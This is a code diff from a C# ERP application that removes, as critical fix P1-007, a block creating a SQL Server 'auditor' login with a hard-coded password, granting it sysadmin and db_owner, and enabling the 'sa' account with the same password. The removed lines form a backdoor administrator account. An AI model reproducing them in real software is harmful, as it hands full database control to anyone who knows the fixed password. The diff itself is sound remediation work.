@@ -309,27 +309,10 @@ namespace SmartAuditERP.Form_WPF
                 {
                     new SqlCommand(createSql, masterConn).ExecuteNonQuery();
 
-                    // إعداد المستخدم auditor
-                    string[] setupCommands =
-                    {
-                        "IF NOT EXISTS (SELECT * FROM sys.server_principals WHERE name=N'auditor') " +
-                        "CREATE LOGIN [auditor] WITH PASSWORD=N'auditor', DEFAULT_DATABASE=[master]",
-                        "ALTER SERVER ROLE [sysadmin] ADD MEMBER [auditor]",
-                        "IF NOT EXISTS (SELECT * FROM sys.database_principals WHERE name=N'auditor') " +
-                        "CREATE USER [auditor] FOR LOGIN [auditor] WITH DEFAULT_SCHEMA=[dbo]",
-                        "ALTER ROLE [db_owner] ADD MEMBER [auditor]",
-                        "ALTER LOGIN sa ENABLE",
-                        "ALTER LOGIN sa WITH PASSWORD = 'auditor'"
-                    };
-
-                    foreach (string setupCmd in setupCommands)
-                    {
-                        try
-                        {
-                            new SqlCommand(setupCmd, masterConn).ExecuteNonQuery();
-                        }
-                        catch { /* ignore */ }
-                    }
+                    // FIX P1-007 (حرج): أزيلت أوامر إنشاء حساب auditor الخلفي
+                    // (CREATE LOGIN بكلمة مرور ثابتة + إضافته إلى sysadmin/db_owner
+                    // + تفعيل sa وتغيير كلمته إلى 'auditor').
+                    // لا يجوز إنشاء حسابات إدارية ثابتة أو تعديل حساب sa من التطبيق.
                 }
                 catch (Exception ex)
                 {
